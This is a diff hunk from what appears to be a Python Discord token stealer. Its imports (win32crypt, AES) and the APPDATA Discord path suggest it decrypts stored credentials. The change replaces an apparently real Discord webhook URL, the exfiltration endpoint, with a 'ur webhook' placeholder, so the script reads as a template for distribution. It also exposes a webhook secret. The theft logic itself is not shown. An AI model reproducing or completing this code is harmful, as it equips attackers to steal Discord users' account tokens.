@@ -6,7 +6,7 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import re
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1401184533142831154/p-PMeOTbGTFfPi6D7inE3bBSjpG6x879NMYIejhnVn3XHdzVl2w_bxGHRTJEVUsL26Bm'  # put your webhook url here
+WEBHOOK_URL = 'ur webhook'
 
 appdata = os.getenv('APPDATA')
 discord_path = appdata + '\\discord'
